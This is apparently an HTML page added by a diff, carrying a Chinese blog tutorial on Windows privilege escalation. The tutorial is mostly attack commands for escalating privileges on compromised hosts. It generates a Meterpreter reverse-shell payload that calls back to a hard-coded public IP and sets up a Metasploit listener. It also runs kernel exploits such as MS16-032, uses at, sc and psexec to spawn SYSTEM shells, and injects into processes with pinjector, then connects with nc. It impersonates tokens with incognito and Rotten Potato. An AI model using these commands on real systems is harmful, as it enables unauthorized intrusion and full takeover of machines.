@@ -1,0 +1,386 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Windows提权姿势 | 秋刀鱼</title><noscript>开启JavaScript才能访问本站哦~</noscript><link rel="icon" href="https://bu.dusays.com/2023/11/08/654af68b25bb8.jpg"><!-- index.css--><link rel="stylesheet" href="/css/index.css?v=1.5.1"><!-- inject head--><link rel="stylesheet" href="https://cdn.cbd.int/solitude-source/icon/scoicon.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/node-snackbar/0.1.16/snackbar.min.css"><!-- aplayer--><link rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css"><!-- swiper--><!-- Open Graph--><meta name="description" content="0x00：前置知识在Windows中，有User、Administrator、System、TrustedInstaller这四种用户权限，其权限从左到右依次升高。而我们在一般的实战中，Webshell等途径获得的权限较低，低权限将使渗透测试受到很多的限制。这就要求我们将当前权限提升到足以满足我们要"><!-- pwa--><script>(win => {
+        win.saveToLocal = {
+            set: function setWithExpiry(key, value, ttl) {
+                if (ttl === 0)
+                    return
+                const now = new Date()
+                const expiryDay = ttl * 86400000
+                const item = {
+                    value: value,
+                    expiry: now.getTime() + expiryDay,
+                }
+                localStorage.setItem(key, JSON.stringify(item))
+            },
+
+            get: function getWithExpiry(key) {
+                const itemStr = localStorage.getItem(key)
+
+                if (!itemStr) {
+                    return undefined
+                }
+                const item = JSON.parse(itemStr)
+                const now = new Date()
+
+                if (now.getTime() > item.expiry) {
+                    localStorage.removeItem(key)
+                    return undefined
+                }
+                return item.value
+            }
+        }
+
+        const DarkModeStatus = localStorage.getItem('theme')
+        if (DarkModeStatus !== null) {
+            if (DarkModeStatus === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'dark')
+            } else {
+                document.documentElement.setAttribute('data-theme', 'light')
+            }
+        }
+
+        const asideStatus = saveToLocal.get('aside-status')
+        if (asideStatus !== undefined) {
+            if (asideStatus === 'hide') {
+                document.documentElement.classList.add('hide-aside')
+            } else {
+                document.documentElement.classList.remove('hide-aside')
+            }
+        }
+    }
+)(window)
+
+console.log(
+    "%c Program: Hexo %c Theme: Hexo-Theme-Solitude %c Version: v1.5.1",
+    "border-radius:5px 0 0 5px;padding: 5px 10px;color:white;background:#ff3842;margin:10px 0",
+    "padding: 5px 10px;color:white;background:#3e9f50;",
+    "border-radius:0 5px 5px 0;padding: 5px 10px;background:#0084ff;"
+);</script><!-- global head--><script>const GLOBAL_CONFIG = {
+    root: '/',
+    algolia: undefined,
+    localsearch: {"preload":false,"path":"/search.xml"},
+    runtime: '2022-10-01 00:00:00',
+    lazyload: {
+        enable: false,
+        error: '/img/error_load.png'
+    },
+    hightlight: {
+        enable: true,
+        limit: 200,
+        expand: false,
+        copy: true,
+    },
+    randomlinks: false,
+    lang: {
+        theme: {
+            dark: '已切换至深色模式',
+            light: '已切换至浅色模式',
+        },
+        copy: {
+            success: '复制成功',
+            error: '复制失败',
+        },
+        backtop: '返回顶部',
+        time: {
+            recent: '最近',
+            yesterday: '昨天',
+            berforeyesterday: '前天',
+            daybefore: '天前',
+            runtime: '天',
+        },
+        search: {
+            empty: '找不到你查询的内容：${query}',
+            hit: '找到 ${hits} 条结果，用时 ${time} 毫秒',
+            placeholder: '输入关键词快速查找',
+        },
+        chs: {
+            chs_to_cht: '繁體中文',
+            cht_to_chs: '简体中文',
+        }
+    },
+    aside: {
+        sayhello: {
+            morning: '一日之计在于晨',
+            noon: '吃饱了才有力气干活',
+            afternoon: '集中精力，攻克难关',
+            night: '不要太劳累了，早睡更健康',
+            goodnight: '睡个好觉，保证精力充沛',
+        },
+        sayhello2: ["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多","🎮 电竞游戏爱好者"],
+    },
+    covercolor: {
+        enable: false
+    },
+    comment: {
+        enable: false,
+        type: '',
+        commentBarrage: false,
+        randomInfoStart: ["聪敏的","可爱的","美丽的"],
+        randomInfoEnd: ["白菜","小可爱","小仙女"],
+        twikoo: {
+            url: '',
+            accessToken: ''
+        },
+        waline: {
+            url: '',
+        }
+    },
+    lightbox: 'null',
+    rightside: {
+        enable: false
+    },
+    ai: {
+        enable: false,
+        key: '',
+        talk: '我是王卓Sco开发的摘要生成助理ScoGPT，ScoGPT在静态部署时进行摘要的撰写，并且在访客访问时通过ScoCorrection转译后的文本摘要实现工具。我在这里只负责已经生成的摘要显示，你无法与我直接沟通，但我可以回答一些预设的问题。',
+        randomPost: false,
+    },
+    music: {
+        enable: true,
+    },
+    translate: undefined,
+};</script><meta name="generator" content="Hexo 7.1.0"></head><body id="body"><!-- universe--><canvas id="universe"></canvas><!-- loading--><!-- console--><div id="console"><div class="close-btn" onclick="sco.hideConsole()"><i class="scoicon sco-close-fill"></i></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" onclick="sco.switchDarkMode()" title="昼夜切换" href="javascript:void(0);"><i class="scoicon sco-moon-clear-fill"></i></a></div><div class="console-btn-item" id="consoleHideAside"><a class="asideSwitch" onclick="sco.switchHideAside()" title="边栏显示控制" href="javascript:void(0);"><i class="scoicon sco-side-bar-fill"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="sco.musicToggle()"><a class="music-switch" title="音乐开关" href="javascript:void(0);"><i class="scoicon sco-disc-fill"></i></a></div></div><div class="console-mask" onclick="sco.hideConsole()"></div></div><!-- sidebar--><div id="sidebar" style="zoom: 1;"><div id="menu-mask" style="display: none;"></div><div id="sidebar-menus"><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" onclick="sco.switchDarkMode()" href="javascript:void(0);"><i class="scoicon sco-moon-clear-fill"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="scoicon  sco-folder-fill"></i><span>文章列表</span></a></li><li><a class="site-page child" href="/categories/"><i class="scoicon  sco-checkbox-multiple-blank-fill"></i><span>全部分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="scoicon  sco-price-tag-fill"></i><span>全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/tlink/"><i class="scoicon  sco-tools-fill"></i><span>工具箱</span></a></li><li><a class="site-page child" href="/music/"><i class="scoicon  sco-disc-fill"></i><span>音乐馆</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-widget card-tags card-archives card-webinfo card-allinfo"><div class="card-tag-cloud"><a href="/tags/%E5%88%9D%E7%A2%B0Android/">初碰Android<sup>3</sup></a><a href="/tags/Blue-Team/">Blue-Team<sup>2</sup></a><a href="/tags/CMD/">CMD<sup>1</sup></a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应<sup>1</sup></a><a href="/tags/django/">django<sup>25</sup></a><a href="/tags/Python%E5%85%A5%E9%97%A8/">Python入门<sup>12</sup></a><a href="/tags/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/">接口测试<sup>1</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞<sup>15</sup></a><a href="/tags/Crawl/">Crawl<sup>1</sup></a><a href="/tags/WAF%E7%BB%95%E8%BF%87/">WAF绕过<sup>1</sup></a><a href="/tags/record/">record<sup>4</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/">学习路线<sup>2</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全<sup>7</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具<sup>10</sup></a><a href="/tags/PC%E5%AE%A2%E6%88%B7%E7%AB%AF/">PC客户端<sup>2</sup></a><a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升<sup>4</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现<sup>10</sup></a></div></div></div></div><!-- keyboard--><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav class="show" id="nav"><div id="nav-group"><div id="blog_name"><a id="site-name" href="/" title="返回博客主页"><span class="title">Solitude</span></a></div><div id="page-name-mask"><div id="page-name"><a id="page-name-text" onclick="sco.toTop()">Windows提权姿势</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>文库</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="scoicon  sco-folder-fill"></i><span>文章列表</span></a></li><li><a class="site-page child" href="/categories/"><i class="scoicon  sco-checkbox-multiple-blank-fill"></i><span>全部分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="scoicon  sco-price-tag-fill"></i><span>全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>我的</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/tlink/"><i class="scoicon  sco-tools-fill"></i><span>工具箱</span></a></li><li><a class="site-page child" href="/music/"><i class="scoicon  sco-disc-fill"></i><span>音乐馆</span></a></li></ul></div></div></div><div id="nav-left"></div><div id="nav-right"><div class="nav-button" id="travellings_button"><a class="site-page" target="_blank" rel="noopener" href="https://www.travellings.cn/go.html" title=""><i class="scoicon sco-train-line"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机一篇文章" href="javascript:void(0);"><i class="scoicon sco-signal-tower-fill"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索"><i class="scoicon sco-search-line"></i></a></div><div class="nav-button" id="nav-totop" onclick="sco.toTop()"><a class="totopbtn"><i class="scoicon sco-arrow-up-line"></i><span id="percent">0</span></a></div><div id="toggle-menu"><a class="site-page"><i class="scoicon sco-menu-line"></i></a></div></div></div></nav><div class="coverdiv" id="coverdiv"><img class="nolazyload" id="post-cover" src="https://w.wallhaven.cc/full/qz/wallhaven-qz5mkr.jpg" alt="Windows提权姿势"></div><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original" title="该文章为原创文章，注意版权协议">原创</a><span class="post-meta-categories"><a class="post-meta-categories" href="/categories/Web安全/">Web安全</a></span><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><span class="tags-name tags-punctuation">权限提升</span></a></div></div></div></div><h1 class="post-title">Windows提权姿势</h1><div id="post-meta"><div class="meta-secondline"><span class="post-meta-wordcount"><span class="post-meta-separator"></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x00：前置知识"><a href="#0x00：前置知识" class="headerlink" title="0x00：前置知识"></a>0x00：前置知识</h2><p>在Windows中，有<code>User、Administrator、System、TrustedInstaller</code>这四种用户权限，其权限从左到右依次升高。而我们在一般的实战中，Webshell等途径获得的权限较低，低权限将使渗透测试受到很多的限制。这就要求我们将当前权限提升到足以满足我们要求的高权限。</p>
+<h2 id="0x01：内核溢出"><a href="#0x01：内核溢出" class="headerlink" title="0x01：内核溢出"></a>0x01：内核溢出</h2><p>获取到一个低权限shell后,执行<code>systeminfo</code>命令查看系统安装的补丁列表</p>
+<p>此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的 EXP 和它们的补丁编号，进行提升权限。</p>
+<p>通常利用缓冲区溢出提权步骤如下：</p>
+<ol>
+<li>信息收集，查看当前权限，版本，补丁等；</li>
+<li>根据收集到的信息确定可利用漏洞；</li>
+<li>根据漏洞查找EXP；</li>
+<li>使用EXP提权。</li>
+</ol>
+<p>1、信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统版本、漏洞补丁、位数、杀软防护、网络、当前用户权限等信息</span><br><span class="line"> ver、systeminfo、whoami、netstat -ano、tasklist /svc等</span><br></pre></td></tr></table></figure>
+
+<p>2、基于补丁、系统版本、位数 来筛选可用的溢出漏洞的EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">手工筛选EXP</span><br><span class="line">使用WindowsVulnScan筛选EXP</span><br><span class="line">使用在线提权网站筛选 https://i.hacking8.com/tiquan</span><br></pre></td></tr></table></figure>
+
+<p>3、上传EXP调用执行去提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基于手工的操作</span><br><span class="line">基于CS的半自动提权</span><br><span class="line">基于MSF的全自动提权</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="octopus-项目工具"><a href="#octopus-项目工具" class="headerlink" title=":octopus:项目工具"></a>:octopus:项目工具</h4><p>脚本项目筛选：补丁&amp;系统&amp;漏洞等</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/vulmon/Vulmap</span><br><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/chroblert/WindowsVulnScan</span><br><span class="line">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br><span class="line">    </span><br><span class="line">在线网站平台筛选：补丁&amp;系统&amp;漏洞等</span><br><span class="line">https://i.hacking8.com/tiquan</span><br><span class="line">http://blog.neargle.com/win-powerup-exp-index/</span><br><span class="line">https://www.adminxe.com/CompareSys/</span><br></pre></td></tr></table></figure>
+
+<p>漏洞EXP下载执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/k8gege/Ladon</span><br><span class="line">https://github.com/Ascotbe/KernelHub</span><br><span class="line">https://github.com/nomi-sec/PoC-in-GitHub</span><br><span class="line">https://github.com/offensive-security/exploitdb</span><br><span class="line">http://cve.mitre.org/data/refs/refmap/source-MS.html</span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits</span><br><span class="line">   </span><br><span class="line">   说明：通过对应补丁漏洞编号寻可利用EXP</span><br><span class="line">        MS&amp;CVE 关系区别&amp;对应反查</span><br><span class="line">        KernelHub 针对常用溢出编号指定找EXP</span><br><span class="line">        Poc-in-Github 针对年份及编号指定找EXP</span><br><span class="line">        exploitdb 针对类型及关键说明指定找EXP</span><br></pre></td></tr></table></figure>
+
+<h4 id="octopus-手动搜索EXP"><a href="#octopus-手动搜索EXP" class="headerlink" title=":octopus:手动搜索EXP"></a>:octopus:手动搜索EXP</h4><p>1、Searchsploit搜索EXP<br><img src="/../../imgs/2913122-20220803104857581-1744114819.png" alt="https://img2022.cnblogs.com/blog/2913122/202208/2913122-20220803104857581-1744114819.png"></p>
+<p>2、Metasploit搜索EXP<br><img src="/../../imgs/2913122-20220803104858219-763856914.png" alt="https://img2022.cnblogs.com/blog/2913122/202208/2913122-20220803104858219-763856914.png"></p>
+<p>3、ExploitDB：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><img src="/../../imgs/2913122-20220803104858863-1565456169.png" alt="https://img2022.cnblogs.com/blog/2913122/202208/2913122-20220803104858863-1565456169.png"></p>
+<p>4、Windows平台提权漏洞集合：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h4 id="octopus-纯手工提权"><a href="#octopus-纯手工提权" class="headerlink" title=":octopus:纯手工提权"></a>:octopus:纯手工提权</h4><p><code>Windows-Exploit-Suggester</code>是受<code>Linux_Exploit_Suggester</code>的启发而开发的一款提权辅助工具。通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，跟systeminfo生成的文件进行比对。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检测脚本https://github.com/AonCyberLabs/Windows-Exploit-Suggester</span><br><span class="line"></span><br><span class="line">exp下载：https://github.com/SecWiki/windows-kernel-exploits</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用Python2环境</strong></p>
+<hr>
+<p>先拿到失陷主机的<code>systeminfo</code>信息，重定向到一个文本文件里</p>
+<p>并将生成的systeminfo信息的文件放在<code>windows-exploit-suggester.py</code>文件同一个目录下；</p>
+<p><img src="/../../imgs/image-20231011191930643.png" alt="image-20231011191930643"></p>
+<p>安装处理Excel的模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 -m pip install xlrd==<span class="number">1.2</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
+
+<p>更新获取漏洞库详细信息</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20231011192302609.png" alt="image-20231011192302609"></p>
+<p>该脚本自动去微软官网爬取截止到 今天为止的漏洞补丁全部爬取下来，生成一个excel文件，</p>
+<p>给出systeminfo信息，自动匹配和微软官网的补丁有哪些差别，并列出</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 windows-exploit-suggester.py --database <span class="number">2023</span>-<span class="number">10</span>-<span class="number">11</span>-mssb.xls --systeminfo <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20231011192422259.png" alt="image-20231011192422259"></p>
+<p>列出来的都是可以利用的，但不一定都能利用成功，找一个<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">exp</a>进行下载</p>
+<p>开启http服务，让失陷主机下载<code>ms16-032.exe</code></p>
+<p><img src="/../../imgs/image-20231011192550754.png" alt="image-20231011192550754"></p>
+<p>失陷主机下载<code>ms16-032.exe</code></p>
+<p><img src="/../../imgs/image-20231011192809197.png" alt="image-20231011192809197"></p>
+<p>双击<code>ms16-032.exe</code></p>
+<p><img src="/../../imgs/image-20231011192940667.png" alt="image-20231011192940667"></p>
+<p><img src="/../../imgs/image-20231011210154783-1704533031639-8.png" alt="image-20231011210154783"></p>
+<h4 id="octopus-CS配合插件进行提权"><a href="#octopus-CS配合插件进行提权" class="headerlink" title=":octopus:CS配合插件进行提权"></a>:octopus:CS配合插件进行提权</h4><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、配置启动</span><br><span class="line">服务器启动服务端：</span><br><span class="line">chmod +x teamserver</span><br><span class="line">./teamserver IP password</span><br><span class="line">客户端连接服务端：</span><br><span class="line">运行cobaltstrike.bat（运行不起来请检测JDK版本）</span><br><span class="line">2、配置监听器生成后执行</span><br><span class="line">3、选择提权模块调用执行</span><br></pre></td></tr></table></figure>
+
+<h4 id="octopus-MSF-local-exploit-suggester-模块"><a href="#octopus-MSF-local-exploit-suggester-模块" class="headerlink" title=":octopus:MSF  local_exploit_suggester 模块"></a>:octopus:MSF  local_exploit_suggester 模块</h4><p>Metasploit内置模块提供了各种可用于提权的local exploits，并会基于架构，平台（即运行的操作系统），会话类型和所需默认选项提供建议。这极大的节省了我们的时间，省去手动搜索local exploits的麻烦。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、生成反弹后门</span><br><span class="line">	msfvenom -p windows/meterpreter/reverse_tcp LHOST=106.14.195.29 LPORT=3333 -f exe -o msf.exe</span><br><span class="line">2、配置监听会话</span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">    show options</span><br><span class="line">    set payload windows/meterpreter/reverse_tcp</span><br><span class="line">    set lhost 0.0.0.0</span><br><span class="line">    set lport 3333</span><br><span class="line">    exploit</span><br><span class="line">    background（反弹后，将会话放到后台）</span><br></pre></td></tr></table></figure>
+
+<p>获取Session会话后提权：</p>
+<p>2.1、筛选EXP模块</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester（全自动：快速识别系统中可能被利用的漏洞）</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line"><span class="built_in">set</span> showdescription <span class="literal">true</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240104145930340.png" alt="image-20240104145930340"></p>
+<p><img src="/../../imgs/image-20240104150042603.png" alt="image-20240104150042603"></p>
+<p>3、利用EXP溢出提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240104150501901.png" alt="image-20240104150501901"></p>
+<h4 id="octopus-MSF-enum-patches模块"><a href="#octopus-MSF-enum-patches模块" class="headerlink" title=":octopus:MSF  enum_patches模块"></a>:octopus:MSF  enum_patches模块</h4><p>会用metasploit中的<code>post/windows/gather/enum_patches</code>模块可以根据漏洞编号快速找出系统中缺少的补丁。直接使用如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_patches</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/2913122-20220803104902598-1864925825.png" alt="https://img2022.cnblogs.com/blog/2913122/202208/2913122-20220803104902598-1864925825.png"></p>
+<h2 id="0x02：AT-SC-PS命令"><a href="#0x02：AT-SC-PS命令" class="headerlink" title="0x02：AT&amp;SC&amp;PS命令"></a>0x02：AT&amp;SC&amp;PS命令</h2><blockquote>
+<p>条件：需要非Web用户权限，不适用常规的WebShell权限提升</p>
+</blockquote>
+<p>1、at命令提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</span><br><span class="line"></span><br><span class="line">适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7以后被剔除.</span><br><span class="line"></span><br><span class="line">当我们拿到低权限的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</span><br><span class="line"></span><br><span class="line">提权命令： at 20:33 /interactive cmd (在20:33分生成一个交互式的System权限的cmd)</span><br><span class="line"></span><br><span class="line">结合msf利用</span><br><span class="line"> 1、 msf生成木马</span><br><span class="line"> 2、msf监听</span><br><span class="line"> 3、提权命令：at 11:11 C:\111\shell.exe</span><br><span class="line"> 4、msf 查看  getuid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>2、SC命令提权</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务。</span><br><span class="line"></span><br><span class="line">适用版本：windows 7、8、03、08、12、16</span><br><span class="line"></span><br><span class="line">原理：sc 命令是 Windows 系统中的服务控制命令，用于创建、修改、启动、停止和删除系统服务。攻击者可以使用 &quot;sc&quot; 命令以高权限运行的方式创建一个恶意的服务，该服务可以在系统启动时以系统权限运行，从而实现权限提升。</span><br><span class="line"></span><br><span class="line">提权命令：</span><br><span class="line"></span><br><span class="line">#创建一个名叫syscmd的新的交互式的cmd执行服务</span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line"></span><br><span class="line">#运行服务</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure>
+
+<p>3、ps命令提权</p>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">pstools工具微软下载地址</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps 命令用于列出当前运行的进程信息。攻击者可以使用 &quot;ps&quot; 命令来获取有关进程的信息，以寻找潜在的目标或确定哪些进程具有较高的特权级别。但是，&quot;ps&quot; 命令本身并不直接提供权限提升功能。</span><br><span class="line"></span><br><span class="line">提权命令：</span><br><span class="line">psexec.exe -accepteula -s -i -d cmd #调用运行cmd</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03：进行迁移注入"><a href="#0x03：进行迁移注入" class="headerlink" title="0x03：进行迁移注入"></a>0x03：进行迁移注入</h2><p>进程迁移注入提权就是将获取到权限低的进程注入至进程中权限高的中，这样就实现了权限提升，同时注入进程提权相当于开启了一个后门， 隐蔽性极高，不会创建新的进程，很难发现。</p>
+<p>这里如果使用的是<code>web权限是无法执行</code>的，必须获取到类似与<code>administrator</code>的权限才能进行进程注入。同时这类提权是不会被杀毒软件拦截的，这是系统的一种特性。</p>
+<h4 id="octopus-pinjector"><a href="#octopus-pinjector" class="headerlink" title=":octopus:pinjector"></a>:octopus:pinjector</h4><p><a target="_blank" rel="noopener" href="https://www.tarasco.org/security/Process_Injector/index.html">工具下载地址</a></p>
+<p>命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pinjector.exe -l    <span class="comment">##列取所有进程</span></span><br><span class="line">pinjector.exe -p &lt;pid&gt; cmd &lt;port&gt;  <span class="comment">##选择一个system权限运行的进程，对此pid进程执行注入，并建立侦听端口</span></span><br><span class="line"></span><br><span class="line">nc 192.168.46.149  &lt;port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>列出所有进程</p>
+<p><img src="/../../imgs/image-20240106175416061.png" alt="image-20240106175416061"></p>
+<p>进程绑定，通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。</p>
+<p><img src="/../../imgs/image-20240106175507212.png" alt="image-20240106175507212"></p>
+<p>nc连接</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.10.200 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240106175624748.png" alt="image-20240106175624748"></p>
+<h4 id="octopus-MSF注入"><a href="#octopus-MSF注入" class="headerlink" title=":octopus:MSF注入"></a>:octopus:MSF注入</h4><p>首先需要生成一个木马然后让其上线，并连接上去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps //查看进程</span><br><span class="line">migrate PID //迁移对应PID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240106175752116.png" alt="image-20240106175752116"></p>
+<h2 id="0x04：令牌获取"><a href="#0x04：令牌获取" class="headerlink" title="0x04：令牌获取"></a>0x04：令牌获取</h2><blockquote>
+<p>条件：必须为 <strong>Administrator</strong> 权限</p>
+<p>不能是Web权限</p>
+</blockquote>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p>
+<h4 id="octopus-MSF令牌窃取"><a href="#octopus-MSF令牌窃取" class="headerlink" title=":octopus:MSF令牌窃取"></a>:octopus:MSF令牌窃取</h4><p>1、获取token</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use incognite</span><br><span class="line">list_tokens -u</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240106180227067.png" alt="image-20240106180227067"></p>
+<p>2、伪造令牌</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../imgs/image-20240106180311894.png" alt="image-20240106180311894"></p>
+<h4 id="octopus-烂土豆提权"><a href="#octopus-烂土豆提权" class="headerlink" title=":octopus:烂土豆提权"></a>:octopus:烂土豆提权</h4><p>上面令牌伪造时必须是<code>administor</code>权限才可以，但如果是webshell权限时，可以尝试搭配烂土豆进行提权，操作如下</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">烂土豆下载地址</a></p>
+<p>先上传<code>potato.exe</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute -cH -f ./potato.exe  //执行potato.exe程序</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;注意&#x3D;&#x3D;：<strong>IIS网站</strong>的webshell成功概率较大</p>
